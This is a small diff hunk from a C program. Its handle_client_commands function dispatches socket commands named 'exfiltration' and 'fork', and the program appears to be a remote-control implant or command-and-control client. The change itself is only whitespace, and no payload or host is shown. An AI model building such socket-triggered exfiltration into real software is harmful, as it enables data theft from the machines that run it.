@@ -49,7 +49,7 @@ void handle_client_commands(int socket_fd)
         if (strcmp(buffer, "exfiltration") == 0)
         {
             printf("Executing exfiltration...\n");
-            exfiltration( socket_fd);
+            exfiltration(socket_fd);
         }
         else if (strcmp(buffer, "fork") == 0)
         {
